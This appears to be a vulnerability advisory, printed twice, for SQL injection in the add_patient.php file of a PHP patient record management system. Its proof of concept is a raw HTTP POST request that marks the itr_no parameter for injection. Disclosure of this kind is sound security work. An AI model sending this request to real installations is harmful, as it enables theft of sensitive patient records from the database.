# patient-record-management-system-in-php has sql injection in add_patient.php

## supplier 

https://code-projects.org/patient-record-management-system-in-php-with-source-code/#google_vignette

## Vulnerability parameter

add_patient.php

## describe

An unrestricted SQL injection attack exists in patient-record-management-system-in-php in add_patient.php The parameters that can be controlled are as follows: $itr_no. This function executes the id parameter into the SQL statement without any restrictions. A malicious attacker could exploit this vulnerability to obtain sensitive information in the server database.

**Code analysis**    

When the parameter is obtained in function , it will be concatenated into SQL statements and executed, which has a SQL injection vulnerability. 

![Image](https://github.com/user-attachments/assets/53442d2c-c071-49b9-8063-17e60c918e40)



## POC

asset the url，can get the sql reqult on the page.

```
POST /add_patient.php HTTP/1.1
Host: healthcarepatientrecordmanagementsystem
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 24
Origin: http://healthcarepatientrecordmanagementsystem
Connection: close
Referer: http://healthcarepatientrecordmanagementsystem/add_patient.php?
Upgrade-Insecure-Requests: 1
Priority: u=0, i

save_patient=1&itr_no=1*
```

**Result**

![image-20241226013405312](https://github.com/user-attachments/assets/fd4a6d5f-7c7d-418d-8db1-2bbd2d5bc9a0)# patient-record-management-system-in-php has sql injection in add_patient.php

## supplier 

https://code-projects.org/patient-record-management-system-in-php-with-source-code/#google_vignette

## Vulnerability parameter

add_patient.php

## describe

An unrestricted SQL injection attack exists in patient-record-management-system-in-php in add_patient.php The parameters that can be controlled are as follows: $itr_no. This function executes the id parameter into the SQL statement without any restrictions. A malicious attacker could exploit this vulnerability to obtain sensitive information in the server database.

**Code analysis**    

When the parameter is obtained in function , it will be concatenated into SQL statements and executed, which has a SQL injection vulnerability. 

![Image](https://github.com/user-attachments/assets/53442d2c-c071-49b9-8063-17e60c918e40)



## POC

asset the url，can get the sql reqult on the page.

```
POST /add_patient.php HTTP/1.1
Host: healthcarepatientrecordmanagementsystem
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 24
Origin: http://healthcarepatientrecordmanagementsystem
Connection: close
Referer: http://healthcarepatientrecordmanagementsystem/add_patient.php?
Upgrade-Insecure-Requests: 1
Priority: u=0, i

save_patient=1&itr_no=1*
```

**Result**

![image-20241226013405312](https://github.com/user-attachments/assets/fd4a6d5f-7c7d-418d-8db1-2bbd2d5bc9a0)
